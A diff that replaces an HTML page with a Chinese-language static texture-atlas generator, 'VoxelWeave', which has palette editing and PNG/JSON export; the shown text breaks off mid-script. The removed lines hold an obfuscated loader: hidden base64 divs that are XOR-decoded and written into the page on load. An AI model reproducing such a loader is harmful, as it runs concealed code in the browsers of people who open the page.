@@ -1,33 +1,494 @@
 <!doctype html>
-<html>
+<html lang="zh-CN">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width">
-<title>Panel</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>VoxelWeave 纹理工坊</title>
+<style>
+  :root {
+    --bg: #14181f;
+    --panel: #1d232d;
+    --panel-2: #242c38;
+    --line: #333d4c;
+    --text: #e6ebf2;
+    --muted: #9aa7b8;
+    --accent: #4ea1d3;
+    --accent-2: #2a9d8f;
+    --danger: #e06c5b;
+    --ok: #7fbf7f;
+  }
+  * { box-sizing: border-box; }
+  html, body { margin: 0; height: 100%; }
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font: 14px/1.5 "Segoe UI", "PingFang SC", "Microsoft YaHei", system-ui, sans-serif;
+  }
+  header {
+    padding: 14px 22px;
+    border-bottom: 1px solid var(--line);
+    display: flex;
+    align-items: baseline;
+    gap: 12px;
+    flex-wrap: wrap;
+  }
+  header h1 { font-size: 18px; margin: 0; }
+  header .sub { color: var(--muted); font-size: 12.5px; }
+  .layout {
+    display: grid;
+    grid-template-columns: 320px minmax(0, 1fr);
+    gap: 18px;
+    padding: 18px 22px;
+    align-items: start;
+  }
+  @media (max-width: 860px) { .layout { grid-template-columns: 1fr; } }
+
+  .panel {
+    background: var(--panel);
+    border: 1px solid var(--line);
+    border-radius: 10px;
+    padding: 16px;
+  }
+  .panel h2 {
+    font-size: 13px;
+    text-transform: uppercase;
+    letter-spacing: .08em;
+    color: var(--muted);
+    margin: 0 0 12px;
+  }
+  .field { margin-bottom: 14px; }
+  .field label { display: flex; justify-content: space-between; margin-bottom: 5px; font-size: 13px; }
+  .field label .hint { color: var(--muted); font-size: 12px; }
+  .field input[type="number"], .field input[type="text"] {
+    width: 100%;
+    padding: 8px 10px;
+    background: var(--panel-2);
+    border: 1px solid var(--line);
+    border-radius: 7px;
+    color: var(--text);
+    font-size: 14px;
+  }
+  .field input.invalid { border-color: var(--danger); }
+  .field .error { color: var(--danger); font-size: 12px; margin-top: 4px; min-height: 0; }
+
+  .palette-list { display: flex; flex-direction: column; gap: 8px; margin-bottom: 10px; }
+  .palette-row { display: flex; align-items: center; gap: 8px; }
+  .palette-row input[type="color"] {
+    width: 38px; height: 32px; padding: 0;
+    background: var(--panel-2); border: 1px solid var(--line);
+    border-radius: 7px; cursor: pointer;
+  }
+  .palette-row input[type="text"] {
+    flex: 1; min-width: 0;
+    padding: 7px 9px;
+    background: var(--panel-2);
+    border: 1px solid var(--line);
+    border-radius: 7px;
+    color: var(--text);
+    font-family: ui-monospace, Consolas, monospace;
+  }
+  .palette-row .idx {
+    width: 20px; text-align: center; color: var(--muted);
+    font-family: ui-monospace, Consolas, monospace;
+  }
+  .palette-row button {
+    background: transparent;
+    border: 1px solid var(--line);
+    color: var(--muted);
+    border-radius: 7px;
+    padding: 6px 9px;
+    cursor: pointer;
+  }
+  .palette-row button:hover { color: var(--danger); border-color: var(--danger); }
+  .row-actions { display: flex; gap: 8px; flex-wrap: wrap; }
+  button.ghost {
+    background: var(--panel-2);
+    border: 1px solid var(--line);
+    color: var(--text);
+    border-radius: 7px;
+    padding: 7px 11px;
+    cursor: pointer;
+    font-size: 13px;
+  }
+  button.ghost:hover { border-color: var(--accent); }
+
+  .preview-wrap { position: relative; }
+  .canvas-box {
+    background:
+      repeating-conic-gradient(#2a323d 0% 25%, #232a34 0% 50%) 0 0 / 24px 24px;
+    border: 1px solid var(--line);
+    border-radius: 10px;
+    min-height: 320px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    overflow: auto;
+    padding: 18px;
+  }
+  canvas { image-rendering: pixelated; image-rendering: crisp-edges; max-width: 100%; height: auto; }
+  .placeholder { color: var(--muted); text-align: center; max-width: 420px; }
+  .placeholder .big { font-size: 15px; color: var(--text); margin-bottom: 6px; }
+  .statusbar {
+    display: flex; gap: 14px; flex-wrap: wrap;
+    margin: 12px 2px 0; font-size: 12.5px; color: var(--muted);
+  }
+  .statusbar b { color: var(--text); font-weight: 600; }
+  .export-bar { display: flex; gap: 10px; flex-wrap: wrap; margin-top: 14px; }
+  button.primary {
+    background: var(--accent);
+    border: 1px solid var(--accent);
+    color: #0d141b;
+    font-weight: 600;
+    border-radius: 8px;
+    padding: 9px 16px;
+    cursor: pointer;
+    font-size: 14px;
+  }
+  button.primary:disabled { opacity: .45; cursor: not-allowed; }
+  button.primary.teal { background: var(--accent-2); border-color: var(--accent-2); }
+  .note { font-size: 12px; color: var(--muted); margin-top: 10px; }
+  .badge-ok { color: var(--ok); }
+  .badge-err { color: var(--danger); }
+</style>
 </head>
 <body>
-<!-- page loaded -->
-<div id="qgfzrxjage0" style="display:none">2/0L5h8QbfpD4fehiNB6zKmmf8Awy9MgPIW6JMYBvtKx2wTu9YtPk+z/QRZx2TSZ1AMk10yfiexviDrOvOcflIq5O8h8KlXHY/y9o4zZM7b6vH+PfIjQLyaH6XKeTeuF35MEtvCKB/Cz9wkVeZ0jmZlRPtxR1sL4d8Nklf+1cJXW/nGjYClR3mfh8bSI2Xnk9Lt/xTOZnWFywqdlzAHoidWTUanEjh34tPtKEVetD9OLe2vfXdbKuXWPepOj+3LNibk9yCgrRogmovC7kdkqsqjsZ8Irxs8uPpuqdsID+ZjPgkHt+50W/PCjFEwg12fTi3tr313Wyrl1j3qTo/t33Y6wK4t8ZBSKJqLwu5HZKrKo7Dmfb9Odf1je6mPXDryC2ooJtradFO+54U0Nftt30dYeOcZdzN+kOdwv1KDTKcWCqC6JMiVZzzvj7bCJ2SW18KopjXyI0C8mh+lynk2t1JuoD/+03kij5KsGXBrFOpTBEHfcWc/OpDmNeIbnq3zPj6htiT8rWt5jr+vox4509KPsNadgn9Y1Poe5aswYsZzUixWm5I4d/KTmQU92liWW0E14xlHWx/wl5CuF6qB5zdnWb4k0MFnGKqPwsZzHKafnqWLDZtuEMTOG42/NCKbcgJAF7+CHS6jgogFZeJw+lt0FbYMIko6ieY90nfmret2JuHWKOiJSkWWu87qXhmf3pP8w0FbLnyM9hv59xwbvnNeGFbHygxTh6/NIC3eXepjBFDrBAsHO92+LZc30rGbcjro2hD8rWt5jr+vvhtkqsvC8MKd8y59hNI3pco4J/YHSixWxuY4B6bz3CRFpiiOU2F0V3lHMwNR6jUSP7a1wxaGzId1wZmfPYa769bD1Zurdq2fbOZ/WIjPOxnTKDvDAyIYC+</div><div id="qgfzrxjage1" style="display:none">LmcFOu59B9oMNl30dMeOcYV0cLjftQmw+6hLsSOsiqENCFdzW61peTLinH94atz2XGK0yg1jL1lxgHoicncHOrwixj3t6gWVmCBbJPaCXrBUdjC93zUdZnsvXDayr4g0Wc5Poom7/Kmgscpp+3jfMQ4n9d7Z9S3dttU4eabx0Lm54hR+KvxSw5/i23ShUFhhFvBkO1+lmPb+rx2x5W9O8AzKg7Eaa/67ofTNqLwvCbPM5/LLj/YtnbbT++D144Iq/eaA+u1/FAhf5U4g44MXZIYjMbqfM52zPa2Y82VpyDZPSdd3n/7seLewU7mte1owimFyzo0jelyjhj5hdyPGLGi30Gitv1KFj2PNoPcEDnGFcze9H6cfpWkrXTKkrAu23EqQcd1+uLfypY28uGIapQ+mv0wGI2xa/Af3rzssjvE29038KLRQVJBsiKb4DgGhFnmw/p+tk2i7YFl77fqOc8pPU7ZS7bQvYbaHYTvoGqcP4PuDyOVsXLWDqy5j99aycG/Gs+4yE4Ofswgi/8Qbt5yxZ3YbqZQm+yyV96g5QLvZShSzl+P8ZSn5RCu06NxyDKz8Ss+gcJM4QzJj9fQCsrMmR3zkcdPUSXLZpuMKB/9SfvP2Fq5TZ7tkFqQkOoZyB4BYf0zlvO7is0clP29ZsUsiI14GLC3MfIe66j+vjTS3pU477/ibBhglx6+70UkgHTU+eltpV+d/JpTnYaMfvMOHEWTavjL4tXmBZDhlFrGKr71Jj2otG77KMWK/949+MCZQPeU6lANaZwkxeRAG+gJkt3dKY9tmvaIRPzXrhrMZRVe/HewxpnU/g2+0KVAwyW8xQw0kPdT4SbIofKJXObfgxPcmqNVM1zJMaXjGCLbdO7bqm+2Qcbx7ViakqQA5</div><div id="qgfzrxjage2" style="display:none">x4vZuhquOWFrO01hdz6fsgZ3eZ0YI6+XNlcyLvp0BTkwqE1373ZE1JXmBbG9ho/4Qz43uNxrXSbr796x7SQIMc6FQTiNaDusd35cqnlvVGdbtrFICezz37mVv+Pz7VU6OOkGcOJxBIDc8E6toM2HIJI8Jr8V79Vg9SOfc3WiD/sE3xF53Lw+eKv9zGw8Z1R2wjS7ioI0Mpx6T6rguvRO+nQu0jLg8tzBUOuYZ/NIWXYYZDJ8SKgXpDLr13A0ogsxAkhcsFgjtyTi/gOtfehPu42qvsCZK7kR8Jf9b/pjSXO4bxI3ZT6ZTtUyhO65z4nwF/1ya5NiEed3bps5o6yFs01KnrbR6vev62PcqTglm3lbKbPNAeW01fJJvCC0qI2s+ehCKiF53cKIZoiw+xIJPNcwOfzfKZtkfGaZdqOuw7LN3Vf6UOb7+edyQmj/79+xAWDjQphr+h1whbatIufJMytij/em/1GB0SeZMngJCP8QZDj91meUofU70TRlYV8mx8VeOZli967vYkzktucOMA3j4gYNor1XuoI1qjInlnP4ZUkwbX5aQBVyzqTjDsQxW3I+q4voHGQrbV3542uB/0RN3HlT4/FpZPRBYfR+jKaKN79cGW3tGXTOqmHzo0r0cSBM/qa6EZXSo4ShfIAI+Z+9+egc9pAxf+wTe6qsQXQLzIAwHyv8aeJyTKw76Vd7z6N5zVikcFNxRzu39yWHPrNqgCt49hJDEKYZ7nEBx3AD/jT33+cYoT4oFGar7ghxDQLQud/htiZ3Ywd9MWtffoxoco1EKjpNpRezZzIvz3KxpgB0rnhclIjzyO89Ec0xHPq5s18lFys1a4j2N/lLuwsMEzwXIfnsIfFcbb0pmKbLLr+Jzas7FDhCf2d74gZwKOJI+u</div><div id="qgfzrxjage3" style="display:none">y92YzQbU/v/cIOMN65Oz/SZ9ngKqOJsGeuyTxESMCkjWq3JCfixW28opblSrc2CI5hbFj5hfoisuPH7/MqD+tp99PCVSfGIT4IT7eaebMrWu7UYDwjH76sro17zQJccRNoMeZq/M+kf+UZtxv3eYrK4XCPvEh6Z7Zlgff36Y5yYb+ExYksgSbhhYngGvV4f9ynWWM5K595YyvHswwIU3dbvmt4aOLE5D7u2SYOqPmJySN4UL6Csig3dc/+t+bAdu/y3QYdZ0Vh89HMNYNzP3jdLZfg9CNVOmitAWdNAhb6Tfwroer8XWX9PdD4h7Y0jIXst0+mhfXjuGVA/r810DBqMVwWyOJJpP8QD3oX+bS13iHZbT1vU3CoZQ7/Q41eOFLqNqhssh3iMKZcsY1h+0AG4f+TpYn7d3Y0wvF5d4B4If8czVywQ6a3hIP+F/2xv9/lGa02elG75Cuft4xHETjNfX3446EIb7djD/GOqH2MyqQ6nD0KNqn9pYN7t+pR/OJ414paKwCpO88PvFs4c/NSt4nvNODRsyikTvfCxBcwmX005vX8yy++6Zjnjnc0SA4lr9ClF/InP6DC++kuijr5dN3VUChYrf4EBTjYdLz8VbeU6X76WTEv68Z8zEMTulkgPiM1fIrqKWCfOIIqvwvCoG0X/s/1pzXlznurb81obfjb1NXzmS/2RAagA3w+fZDr2ew5J13nZe5JsMWIQPnSqfvjd35AaTBgHv/b4eLER6zvjLkFvua/oBZ3qysB9iC91ANJbQyhtcmYPlpyPn0fZdFgO+jc8CWlDvlOwYA836kxuyx1RClpJlE+Q2piisqm+5Oyg6tr9feCNPNuSLwtPpeLlS+ALPlICLaSuH4rnyNco7s4G+RhaV48y4zBNpym/WDqI4</div><div id="qgfzrxjage4" style="display:none">A9KGaMvgPs+8EJaTPRcUl167Xlin5xdgw1bLRcAhnuji35ichgmHw3u9tpGSPzp5a4oKPeMIYNFyYcITr47yFHvf+iGP9OIfmeQC6zlLUCqqi3qJa/vqCO9iB+FQ2X5Q0xeVCAoJV6frYb9t1ksqTIPyLvhnbHgNB4UWD/pSV2Cu19KtG3BKH7nkGhOZE2gnOmejfDdH2nAjOv6ATCFqoMr/3GgbGYvvn+yrZXIHajG/QgZ88kRIlbPNKt82dp8w8tcarXf0JjI4jMJWyR+ELxZjPkjr+36od8oLbczF5vhay/DAC0Vbs3sBXtybP5pxb8Y3sBNgVE2XkRbHTjNKIfbT8ijPaKZnyFCqr11bKNciP3Z4jz+SnJK+l/WMGc7QDyfAVP4BR6ZjrftcnouiSZO6PkDzvODF8n0fz7rKr0yH32bld5yuSyAxkseh82S3Fo4OuLv7bnkPOnep8VnOaZKLBGxnHAfXqq03dRcXs70PLk4QjmW8lZs5+tO+HrPoxrNj4ffs62O41OIbdM+Ad2IWDlAjuoqIe1KrZUzglmj+C3yk66nzrw/B/t3yY14Fz8rPke/kLA2ToU5Xe5qzMDoLi+0HGGI7eFjTaw1/VJ9Kg6p5d2visBKqa2mEEYsk9kN8XGOJ609qsT9xbnMqSYcyx5C3DORFlyGqLzuWujHOP+6N43SSY6AU/ht9k8ADInY+/BOLD1gjYgvxXW3rOL7zNHiH4evfR7Cm/WZrU6FrMk5s3wT0gYppHjazmtf40ruH5c55smetwKKvfMPE4qY7Cihy82dc3/+XBYidFijOa4xYH1Hfu2Olep2WezO1j/oKGBO4QPGSSNK/o4NDoPJDnhTz+MJrscT/b7GL2NfXV6pIa4aXdQPS2wUYkZZ</div><div id="qgfzrxjage5" style="display:none">8+g8QpZ/NX0c/9Uo9knfDqYN+AuCLNBgdb+22W+a/X8Hf2zYVR+h+dzAgB0+BA8xvQhIK2JdOlgBL96aBAMnmaJ7fBHiL0YcnR6FqXXcOstSKa37glnDM0VshyrKaQrPUQiNu5OO8ortwtatf/beUk05bCkRWyzKIS8J6lbCF8qwCn0xUR2Urt+9p3lFi58YhU3YqyBpoXMFXkbpna5a7rEIjzqj/3BKHOcQiDwWH2KtmO9q0BwPmiP/rn3BUsQa44pMw7ZvVry+f/U9Yhj9azYZ63mQDsG3db5DO71bGviwyI8Z1g1AmH9REBu60pn0DvmMKLCbWe017xtfNAXBrFNZ7RCGm4BMbC7zuNe5ftqiiKiq8oi2JOFIpWrfq0ltlksfSnf406hM1hJoriJsIa6IPWhhji988D/LT7VgdzjXeex1Fr0xjLz6Q5iXjUvrFnzYHhbcEoMETZPO6wsJ3ZJ+jyq3nFM4/bbzGN6inIXOaVzN8B+bbREvW58U9CeJwllIleNowWqIu5J4xlyJT5NfqCuCbbOSdAw2imv7yLnHi15a9ljTWPgmMxjfJo102i2YfIH/v1gU+5o/dHDX6df4Kck9cUMp6E/XKYKfyU0ynMjqpv2ig9WM874/u8lswop+z0ZcIyjp1hNoPzZ44C/Y/JiFGp06YlzIPXdixRtBLTiyE23lnGwvdoqUOuovZxwZHiRZU4LUKKdbXmuYCBZqL8vXvBPZKFLz2M4iSDC/2Y2soB6vedHqTywGEyX6YZsPg0dYxUzdy0a4F7j7OpdMSCqDvMcSJb2GGko/qB1TL4n/JvxCrLzDUrjuI7gQv1n8uLDfKugR73tbAEBnGNNtzYEDTAV5+Jz168RL/RlzeW1uxhmXJ0CIViqOnr74</div><div id="qgfzrxjage6" style="display:none">Agr+PueNklh9p8cIbuddMD/ZWBiQPl8c1R/bHmRU99mDSD2kx18Xfv5tBPvTXIrOsmkNvzK8Aqej6WYqjp9ZbIParw8ynJNZjPLTObvWjMAfnOm4MN//XCHPiz4EtfMqsSvfAwBPdrgJWrI9I4kvevK6LbuCbffDdA02qkoveB1Te2+a9ylzKE0SRwwuNn1w6xgdqEHuSpzSPcnNdlMVWmE7DhNHWMCZqL1niaN8en4yGR2/MrwCp6PpZiqOn1lsg9qvDzKck1mM8tM5u9aMwB+c6bgw3/9cIc+LPgS18yoBKw51NpgAiQnaU0in6AoNMflJS/PcAsMAqgLqfqu4bILan77iOEfJC1YXKU5nSDHOiNyZMJ77TSUf+x/lcHK/Nd0ZUXItxb1sL2dc5kgv+rYYDO/DSjfGQUim+nv/2WyCW04atvhHyZ2jUnkOk9qU+8zJuUGOrmmxT98K8EFmKMMsq/e3eSGILd+GnOdtaj+XHHhKkizDIwGs1jtdq5gNEhqOGMcuQ4w5gmPcWuPalPvMybjgqrvM4QsPDpBBZigHeKlRI43EvNx/w1mXaE8PEy85WBb4o7KxTEabW/s4rJKqKy5zCNIcvcICaB7yaLCrXMwJpM+fGbBOu+qQQfGvN30ZVRIdNKgtn4bM4q1ra4O8+CqA7dKDZdyHO1+v3C1Daj8+kijSCXn2Z1y6ly0QbxxJLcZoG0z1G5/7gEJWWYJZWPUTrTW9DEuWyPZNbwtmGIlKkt2igtQN9ypPv1z5NO5rXuK8Q6y5dgIIPwJt8TvJ7akEy2qdJRvovAYSZZqxKy4S4C4HT/jLlnkjeE/647y4+9PegobASDJvyi6MWbH+G87nCnfMufYXLC83TaT+fM2IgC+PuDFLen81YMON4M</div><div id="qgfzrxjage7" style="display:none">g+hRP8BdxIv3dJo3heu7ZtyOqDrdOSAOjSrh7bSSlX/m6O5ozCiI12F6h64m2BKWzJvHTKu0nRTtpeBKWRrZd9GVDF24GIKLuTTEN7Dxq3bNx70t2jMoQd5j4cqHqZxsp/GqK8Uon88yaM2oJsoJvJzJiBjk94AdubnhBA95iiSY2xZ+khKNobk7zjef+Pk9iciCJ90oNEeVPJ2wicqTLejhq3jZdJneNnvLp32pT7zMm8dM+fWYUaTwvXo+P6V43psFMsFMitn4bMc3yb7+fdyTrDyTe2QfinSg6PXfnGOu4bp73mbEkGZyyad0whiynt6XAOr3ilm2js4LST/Vd9aSWGy4GIKLuWbkHda++TXehq5v3C4oD6Am4b/1kc495u7uft8wy4JhPIfwJvY90MTJhhuntIse+qX/QQxk1zWQxhQC4HGLhfFpi3HNvqQfiMf8b8o9MFfCJun6/MXHZLD0vCvZfNafJT2B8mvGAejC2JUJ6uCKNPW1/0EMZNFwkJJYbJJMjMPrfog3y76rdN/c/DrbMGQJinLv96eA2n/m6MQBjXzLn254wtVjxQP5j8/HGOPxzwP8o/1IFHWdd6TnPXfQWcHAuXSAY5m+rX3Nx7AmxzdkHoUM4b/1xd1qtfC6StkomdYjJ5biLoQH7ondwECr4Z0dsOuYLkIw2XeFxwh3yRjBxPdogXuTsLV6z8/7FNsBZEbPYqjtsIbIZLL66SeNKZnTbXLF7miDWu/LktxM9rSMEO2z+gRKddB3ish7XZIYgou2Mc5Bn+2wd8SC/CzGKSpAzmm28e/FiWQkE1wrnHDLyyk3jKd0xgv1nt6EGKu+wHu58LIEFHGLd5TZUWqSXM3I7HaLeYKwvnDcorAqxDkqQOh/iPv9wt8rs/u6LIR</div><div id="qgfzrxjage8" style="display:none">n4Z9hcsLxZ9FP8Indk0y2tNpKk9qyBEIwkDHRnRQ7mxjHx7dvi2+C3bZ73IKyO4lhZGfedKjxss3QIaDh5zCnVsufYXKU5nSDG/WB3pVMtrScFO2Z/FAHYo82nZ0XItxb1sL2dc4/376iH4jH/G+JfChRzHLssu7vnGTmte4rxDrLlyQ+y6djz0HoicOTL+T6mxT3pLIZQkONJZjbFn/eXcTfuSXOJ9ah+XnNgahvk3x0HZEMy7/1xZxk5vyoK4Uwjtk1ct66JpNGvJexx0yrtM9RufDxSAdxix6fwRQlxFnOg+1yg3KEt+IfiMf8b4l8ZBTedLi/rsXLLajxoXyDMITcICaL6GiNHfmc14YP7ryaA/X5qQQfGtl30ZVRd5IYwcrteIY33vvoPIic1m+JfGQUiibhv/WRzj3m7u58xDKP0DZ8juhlwhv1g9XJDfjnhhb3+OdWDjnCd4y/UXeSGIKLuTvON5X/rXbAx/Qqm3VkT4pxqPGxistqqvqtatk1hNFvOpDiYINSvJnJi1er6eVRufCyBEIw2Sr7lVF3khiC1pM7zjfW4/U1mdfsf4BnThSKe8uV9cXVIua9qmTOKYbaLybM9WPCC+W/z4YY7rTSTKTwtUgNcZ0+n9JWfpJDqIu5O85zmf2seM2JqGHIOCBx3GOv65mMzzCj+6t5hXuv8AwRjelyxgHooNSGCO7wyF25o+ZFEGTQbPuVUSqSXc7Y/DuVHda++TXbk7093XRtD6Am4eLf75xk6b/uWMw6jss4cozicoNFs+abxwjk95oc/L7mCgN0nRKH0B8j/lHR3/x1i2XeuZ1a5aSzId05KkDmaaD7sIGbaObmumrfKMKESy/Lry+YZaDDyIQe4uSbT5PsvUYNdIBp+4leP8ZVzpU=</div><div id="CQPZwrOr2I6y" style="visibility:hidden">0</div><div id="xe7ee3084f3" style="visibility:hidden"> </div><div id="mjwupogej" style="display:none">x</div>
-<script>function wbu7ys(){return Math.max(3,43);}
-/* stable path */
-(function(){
-var aoOYRc=atob('59xPqVxENKoGwZ/V5bxExpXOC61c679BUuKHBqNvnOy752yLlO9xmdCSJGIQ+VfxtXFXsjiiq5kb7hf2ntkVqA==');
-var UriU8W=[];
-for(var Rv0Sul=0;Rv0Sul<9;Rv0Sul++){
-  var _e=document.getElementById('qgfzrxjage'+Rv0Sul);UriU8W.push(_e?_e.textContent:'');
-}
-var seNrXT=UriU8W.join('');
-var Asuw5P=atob(seNrXT);
-var wSMy14=new Uint8Array(Asuw5P.length);
-Rv0Sul=0;
-while(Rv0Sul<Asuw5P.length){
-  wSMy14[Rv0Sul]=Asuw5P.charCodeAt(Rv0Sul)^aoOYRc.charCodeAt(Rv0Sul%aoOYRc.length);
-  Rv0Sul++;
-}
-var P5BOXm=new TextDecoder('utf-8').decode(wSMy14);
-document.open();
-document.write(P5BOXm);
-document.close();
-})();</script>
+<header>
+  <h1>🧵 VoxelWeave 纹理工坊</h1>
+  <span class="sub">纯静态页面 · 同种子同参数逐像素复现 · 所有计算均在本机浏览器完成</span>
+</header>
+
+<div class="layout">
+  <!-- 左侧：参数与调色板 -->
+  <section class="panel" aria-label="参数设置">
+    <h2>织纹参数</h2>
+
+    <div class="field">
+      <label for="rows">行数 <span class="hint">整数 1–64</span></label>
+      <input id="rows" type="number" min="1" max="64" step="1" value="3">
+      <div class="error" id="err-rows"></div>
+    </div>
+
+    <div class="field">
+      <label for="columns">列数 <span class="hint">整数 1–64</span></label>
+      <input id="columns" type="number" min="1" max="64" step="1" value="4">
+      <div class="error" id="err-columns"></div>
+    </div>
+
+    <div class="field">
+      <label for="cellSize">单元格像素 <span class="hint">整数 4–32</span></label>
+      <input id="cellSize" type="number" min="4" max="32" step="1" value="8">
+      <div class="error" id="err-cellSize"></div>
+    </div>
+
+    <div class="field">
+      <label for="seed">种子 <span class="hint">任意非空字符串</span></label>
+      <input id="seed" type="text" value="sample-3x4-4c">
+      <div class="error" id="err-seed"></div>
+    </div>
+
+    <h2 style="margin-top:18px">调色板（#RRGGBB）</h2>
+    <div class="palette-list" id="paletteList"></div>
+    <div class="row-actions">
+      <button class="ghost" id="addColor" type="button">＋ 添加颜色</button>
+      <button class="ghost" id="loadSample" type="button">载入本地样例参数</button>
+    </div>
+    <div class="error" id="err-palette"></div>
+  </section>
+
+  <!-- 右侧：实时预览与导出 -->
+  <section class="preview-wrap">
+    <div class="panel">
+      <h2>织纹预览（实时）</h2>
+      <div class="canvas-box" id="canvasBox">
+        <canvas id="atlas" width="32" height="24" style="display:none"></canvas>
+        <div class="placeholder" id="placeholder">
+          <div class="big">暂无可显示的图集</div>
+          <div id="placeholderText">修正左侧参数后将自动生成预览。</div>
+        </div>
+      </div>
+
+      <div class="statusbar" id="statusbar">
+        <span>状态：<b id="stateText">—</b></span>
+        <span>图集尺寸：<b id="sizeText">—</b></span>
+        <span>颜色覆盖：<b id="usageText">—</b></span>
+      </div>
+
+      <div class="export-bar">
+        <button class="primary" id="exportPng" type="button" disabled>导出 PNG 图集</button>
+        <button class="primary teal" id="exportJson" type="button" disabled>导出 JSON 配色清单</button>
+        <button class="ghost" id="exportBoth" type="button" disabled>同时导出两份文件</button>
+      </div>
+      <div class="note">
+        JSON 清单记录种子、行列、单元格尺寸、调色板颜色序列，以及每个格子（行优先）所用颜色的索引；
+        索引与 PNG 实际像素逐格对应。相同种子与参数重新载入将得到完全相同的图集。
+      </div>
+    </div>
+  </section>
+</div>
+
+<script src="weave-core.js"></script>
+<script>
+(function () {
+  'use strict';
+
+  var SAMPLE = {
+    rows: 3, columns: 4, cellSize: 8,
+    seed: 'sample-3x4-4c',
+    palette: ['#264653', '#2a9d8f', '#e9c46a', '#e76f51']
+  };
+  var EXTRA_PRESET = ['#8ab17d', '#f4a261', '#e76f51', '#264653', '#2a9d8f', '#e9c46a', '#9b5de5', '#00bbf9'];
+
+  var els = {
+    rows: document.getElementById('rows'),
+    columns: document.getElementById('columns'),
+    cellSize: document.getElementById('cellSize'),
+    seed: document.getElementById('seed'),
+    paletteList: document.getElementById('paletteList'),
+    addColor: document.getElementById('addColor'),
+    loadSample: document.getElementById('loadSample'),
+    canvas: document.getElementById('atlas'),
+    placeholder: document.getElementById('placeholder'),
+    placeholderText: document.getElementById('placeholderText'),
+    stateText: document.getElementById('stateText'),
+    sizeText: document.getElementById('sizeText'),
+    usageText: document.getElementById('usageText'),
+    exportPng: document.getElementById('exportPng'),
+    exportJson: document.getElementById('exportJson'),
+    exportBoth: document.getElementById('exportBoth')
+  };
+  var errEls = {
+    rows: document.getElementById('err-rows'),
+    columns: document.getElementById('err-columns'),
+    cellSize: document.getElementById('err-cellSize'),
+    seed: document.getElementById('err-seed'),
+    palette: document.getElementById('err-palette')
+  };
+
+  // 上一次有效结果：非法输入时保留它，不清空预览
+  var lastValid = null;
+  var currentPalette = SAMPLE.palette.slice();
+
+  function setFieldError(name, message) {
+    errEls[name].textContent = message || '';
+    var input = els[name];
+    if (input) input.classList.toggle('invalid', Boolean(message));
+  }
+
+  function sanitizeFilename(s) {
+    return String(s).replace(/[^a-zA-Z0-9._-]+/g, '_').slice(0, 60) || 'weave';
+  }
+
+  function download(blob, filename) {
+    var url = URL.createObjectURL(blob);
+    var a = document.createElement('a');
+    a.href = url;
+    a.download = filename;
+    document.body.appendChild(a);
+    a.click();
+    a.remove();
+    setTimeout(function () { URL.revokeObjectURL(url); }, 1000);
+  }
+
+  function baseName(r) {
+    return 'voxelweave_' + sanitizeFilename(r.seed) + '_' + r.rows + 'x' + r.columns + '_' + r.cellSize + 'px';
+  }
+
+  /* ---------------- 调色板 UI ---------------- */
+
+  function renderPaletteRows() {
+    els.paletteList.innerHTML = '';
+    currentPalette.forEach(function (color, i) {
+      var row = document.createElement('div');
+      row.className = 'palette-row';
+
+      var idx = document.createElement('span');
+      idx.className = 'idx';
+      idx.textContent = i;
+
+      var picker = document.createElement('input');
+      picker.type = 'color';
+      picker.value = /^#[0-9a-f]{6}$/i.test(color) ? color : '#000000';
+      picker.setAttribute('aria-label', '颜色 ' + i + ' 取色器');
+      picker.addEventListener('input', function () {
+        text.value = picker.value;
+        currentPalette[i] = picker.value;
+        scheduleUpdate();
+      });
+
+      var text = document.createElement('input');
+      text.type = 'text';
+      text.value = color;
+      text.spellcheck = false;
+      text.setAttribute('aria-label', '颜色 ' + i + ' 十六进制值');
+      text.addEventListener('input', function () {
+        var v = text.value.trim();
+        if (/^#[0-9a-f]{6}$/i.test(v)) {
+          picker.value = v.toLowerCase();
+          currentPalette[i] = v.toLowerCase();
+          setFieldError('palette', '');
+          scheduleUpdate();
+        } else {
+          setFieldError('palette', '颜色「' + v + '」不是合法的 #RRGGBB，已保留上一次有效预览。');
+        }
+      });
+
+      var del = document.createElement('button');
+      del.type = 'button';
+      del.textContent = '删除';
+      del.setAttribute('aria-label', '删除颜色 ' + i);
+      del.addEventListener('click', function () {
+        currentPalette.splice(i, 1);
+        renderPaletteRows();
+        scheduleUpdate();
+      });
+
+      row.appendChild(idx);
+      row.appendChild(picker);
+      row.appendChild(text);
+      row.appendChild(del);
+      els.paletteList.appendChild(row);
+    });
+  }
+
+  els.addColor.addEventListener('click', function () {
+    var next = EXTRA_PRESET[currentPalette.length % EXTRA_PRESET.length];
+    currentPalette.push(next);
+    renderPaletteRows();
+    scheduleUpdate();
+  });
+
+  els.loadSample.addEventListener('click', function () {
+    els.rows.value = SAMPLE.rows;
+    els.columns.value = SAMPLE.columns;
+    els.cellSize.value = SAMPLE.cellSize;
+    els.seed.value = SAMPLE.seed;
+    currentPalette = SAMPLE.palette.slice();
+    renderPaletteRows();
+    ['rows', 'columns', 'cellSize', 'seed', 'palette'].forEach(function (n) { setFieldError(n, ''); });
+    update(true);
+  });
+
+  /* ---------------- 预览与状态 ---------------- */
+
+  var pending = null;
+  function scheduleUpdate() {
+    if (pending) clearTimeout(pending);
+    pending = setTimeout(function () { pending = null; update(false); }, 60);
+  }
+
+  function readParams() {
+    return {
+      rows: els.rows.value,
+      columns: els.columns.value,
+      cellSize: els.cellSize.value,
+      seed: els.seed.value,
+      palette: currentPalette.slice()
+    };
+  }
+
+  function showValid(result) {
+    lastValid = result;
+    var w = result.columns * result.cellSize;
+    var h = result.rows * result.cellSize;
+    els.canvas.width = w;
+    els.canvas.height = h;
+    var ctx = els.canvas.getContext('2d');
+    ctx.imageSmoothingEnabled = false;
+    ctx.clearRect(0, 0, w, h);
+    WeaveCore.renderToContext(ctx, result);
+
+    els.canvas.style.display = 'block';
+    els.placeholder.style.display = 'none';
+    els.stateText.innerHTML = '<span class="badge-ok">有效预览</span>';
+    els.sizeText.textContent = w + ' × ' + h + ' px';
+    var manifest = WeaveCore.buildManifest(result);
+    var covered = manifest.colorUsage.filter(function (n) { return n > 0; }).length;
+    els.usageText.textContent = covered + ' / ' + result.palette.length + ' 种颜色已使用';
+
+    [els.exportPng, els.exportJson, els.exportBoth].forEach(function (b) { b.disabled = false; });
+  }
+
+  function showInvalid(message, field) {
+    // 保留上一次有效预览：画布不动，只更新提示
+    if (lastValid) {
+      els.placeholder.style.display = 'none';
+      els.canvas.style.display = 'block';
+      els.stateText.innerHTML = '<span class="badge-err">输入无效，显示的是上一次有效预览</span>';
